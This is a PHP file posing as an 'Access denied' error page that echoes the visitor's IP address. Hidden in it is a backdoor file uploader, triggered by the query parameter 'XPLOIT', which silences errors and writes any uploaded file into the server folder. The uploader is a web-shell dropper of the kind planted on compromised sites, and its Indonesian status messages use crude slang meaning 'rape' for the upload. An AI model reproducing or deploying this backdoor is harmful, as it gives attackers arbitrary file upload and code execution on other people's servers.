<html>
  <head>
<title>Access denied</title>
</head><body>
<h1>Access denied</h1>
<p>You are not authorized to access this page.</p><?php echo "<tr><td><font>IP Address :".$_SERVER['REMOTE_ADDR']."<tr><td></font><br><br><br><br>";?>
</body>
</html>

<?php
set_time_limit(0);
error_reporting(0);
error_log(0);
if(isset($_GET["XPLOIT"])){
echo'<center><form method="post" enctype="multipart/form-data" name="memek" id="uploader"><input type="file" name="file" size="50"><input name="APLOT" type="submit" id="APLOT" value="PERKOSA"></form></center>';

if( $_POST['APLOT'] == "PERKOSA" ) {
if(@copy($_FILES['file']['tmp_name'],
$_FILES['file']['name'])) {
echo '<br><br><center><b>berhasil di perkosa di folder ini mas</b><br><br>'; 
} else { 
echo '<br><br><center><b>gagal di perkosa mas</b><br><br></font>'; 
} 
}
}
?>